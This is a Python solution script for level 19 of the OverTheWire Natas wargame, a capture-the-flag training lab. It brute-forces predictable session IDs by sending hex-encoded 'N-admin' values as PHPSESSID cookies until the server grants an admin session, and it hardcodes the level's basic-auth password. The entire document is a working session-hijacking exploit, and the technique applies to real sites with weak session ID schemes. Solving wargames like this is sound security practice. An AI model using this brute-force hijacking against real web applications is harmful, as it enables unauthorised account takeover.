import requests
from requests.auth import HTTPBasicAuth

session = requests.Session()
session.auth = HTTPBasicAuth("natas19", "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")

for i in range(0, 641):
    payload = f"{i}-admin"
    custom_cookie = {"PHPSESSID": payload.encode('utf-8').hex()} 
    response = session.get("http://natas19.natas.labs.overthewire.org/index.php", cookies=custom_cookie)
    print(f"Trying PHPSESSID: {i}")

    if "You are an admin" in response.text:
        print(f"\nFound admin session with PHPSESSID: {i}")
        print("Cookie value:", payload.encode('utf-8').hex())
        break
